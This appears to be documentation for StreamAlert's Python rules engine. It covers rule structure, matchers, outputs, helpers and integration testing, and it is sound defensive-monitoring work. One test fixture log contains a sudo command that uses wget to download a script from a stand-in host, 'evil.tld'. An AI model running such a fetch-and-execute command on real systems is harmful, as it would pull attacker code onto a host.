Rules
=====

* Rules encompass data analysis and alerting logic
* Rules are written in native Python, not a proprietary language
* A Rule can utilize any Python function or library
* A Rule can be run against multiple log sources if desired
* Rules can be isolated into defined environments/clusters
* Rule alerts can be sent to one or more outputs, like S3, PagerDuty or Slack
* Rules can be unit tested and integration tested

Getting Started
---------------

* Rules are located in the ``rules/`` sub-directory.
* We suggest a separate rule file is created for each cluster defined in the ``variables.json`` file.
* Examples: ``corp.py``, ``pci.py``, or ``production.py``
* This structure is optional, you can organize rules however you like.

All rule files must be explicitly imported in ``main.py``.

Example::

  from rules import (
      corp,
      pci,
      production
  )

.. note:: If you skip the step above, your rules will not be used by StreamAlert.

Overview
--------

Each Rule file must contain the following at the top::

  from stream_alert import rule_helpers
  from stream_alert.rules_engine import StreamRules
  rule = StreamRules.rule

All rules take this structure::

    @rule('example',
          logs=[...],
          matchers=[...],
          outputs=[...])
    def example(record):
        # code                    # analyze the incoming record w/ your logic
        return True               # return True if an alert should be sent

You define a list of ``logs`` that the rule is applicable to.  Rules will only be evaluated against incoming records that match the declared log types.

Example
-------

Here’s an example that alerts on the use of sudo in a PCI environment::

    from fnmatch import fnmatch

    @rule('production_sudo',                          # name of the rule
          logs=['osquery'],                           # applicable datasource(s)
          matchers=['pci'],                           # matcher(s) to evaluate
          outputs=['s3', 'pagerduty', 'slack'])       # where to send alerts
    def production_sudo(record):                      # incoming record/log
        table_name = record['name']
        tag = record['columns']['tag']
        return (
          table_name == 'linux_syslog_auth' and
          fnmatch(tag, 'sudo*')
        )

You have the flexibility to perform simple or complex data analysis

Parameter Details
-----------------

logs
~~~~~~~~~~~

``logs`` define the log sources the rule supports; the ``def`` function block is not run unless this condition is satisfied.

* A rule can be run against multiple log sources if desired.
* Log sources (e.g. datasources) are defined in ``conf/sources.json`` and subsequent schemas are defined in ``conf/logs.json``. For more details on how to setup a datasource, please see the Datasources section.

matchers
~~~~~~~~

``matchers`` is optional; it defines conditions that must be satisfied in order for the rule to be evaluated.  This serves two purposes:

* To extract common logic from rules, which improves readability and writability
* To ensure necessary conditions are met before full analysis of an incoming record

Matchers are defined in ``rules/matchers.py``. If desired, matchers can also be defined in rule files if the following line is added to the top::

  matcher = StreamRules.matcher

In the above example, we are evaluating the ``pci`` matcher.  As you can likely deduce, this ensures alerts are only triggered if the incoming record is from the ``pci`` environment. This is achieved by looking for a particular field in the log. The code::

    @matcher('pci')
    def is_prod_env(record):
        return record['decorations']['envIdentifier'] == 'pci'


outputs
~~~~~~~

``outputs`` define where the alert should be sent to, if the return value of the rule is ``True``.

StreamAlert supports sending alerts to PagerDuty, Slack and Amazon S3. As demonstrated in the example, an alert can be sent to multiple destinations.

req_subkeys
~~~~~~~~~~~

``req_subkeys`` is optional; it defines the required sub-keys that must exist in the incoming record in order for the rule to be evaluated.

This feature should be avoided, but it is useful if you defined a loose schema to trade flexibility for safety; see `Schemas <conf-schemas.html#json-example-osquery>`_.

Examples::

  @rule('osquery_etc_hosts',
        logs=['osquery'],
        outputs=['pagerduty', 's3'],
        req_subkeys={'columns':['address', 'hostnames']})
        ...

  @rule('osquery_listening_ports',
        logs=['osquery'],
        outputs=['pagerduty', 's3'],
        req_subkeys={'columns':['port', 'protocol']})
        ...


Helpers
-------
To improve readability and writability of rules, you can extract commonly used ``Python`` processing logic into custom helper methods.   These helpers are defined in ``stream_alert/rule_helpers.py`` and can be called from within a matcher or rule.

Example function::

    def in_set(data, whitelist):
        """Checks if some data exists in any elements of a whitelist.

        Args:
            data: element in list
            whitelist: list/set to search in

        Returns:
            True/False
        """
        return any(fnmatch(data, x) for x in whitelist)

Example use of that function within a rule::

    @rule('foobar', ...)
    def foobar(record):
        user = 'joe'
        user_whitelist = { 'mike', 'jin', 'jack', 'mary' }

        return in_set(user, user_whitelist)


Rules Testing
-------------

In order to test the effectiveness of our new rules, you can run a set of local integration tests to verify alerts would be triggered.  The `stream_alert_cli.py` command line tool comes built-in with a `lambda test` command.

Configuration
~~~~~~~~~~~~~

To get started, create (or find) an example log for your given rule.  If the rule you added expects incoming records to be JSON, add a raw JSON record into the ``trigger_events.json`` file for the related stream.

Example logs will be stored in the ``test/integration/fixtures/kinesis`` subdirectory.  A new folder should be created for each Kinesis stream as declared in your `sources.json <conf-datasources.html>`_.

Within each of these folders, add the following two files:

* ``trigger_events.json``
* ``non_trigger_events.json``

These files allow you to separate true positives from false positives.

Recall our earlier example that alerts on the use of ``sudo`` in the ``pci`` environment. In ``trigger_events.json``, you would add an example log that should alert::

  {
    "name": "linux_syslog_auth",
    "hostIdentifier": "foobar",
    "unixTime": "1470824034",
    "decorations": {
      "envIdentifier": "pci",
      "roleIdentifier": "memcache"
    },
    "columns": {
      "tag": "sudo",
      "message": "john_adams : TTY=pts/0 ; PWD=/home/john_adams ; USER=root ; COMMAND=/usr/bin/wget http://evil.tld/x.sh",
      "facility": "authpriv"
    },
    "action": "added"
  }

.. warning:: One event per line. This log was put on multiple lines for readability and education purposes.

And lastly, in ``non_trigger_events.json``, you would add an example that shouldn't fire.

Running Tests
~~~~~~~~~~~~~

To test an example record coming from Kinesis::

  ./stream_alert_cli.py lambda test --func alert --source kinesis

To test example records from S3::

  ./stream_alert_cli.py lambda test --func alert --source s3

.. note:: coming soon - Amazon S3 testing instructions
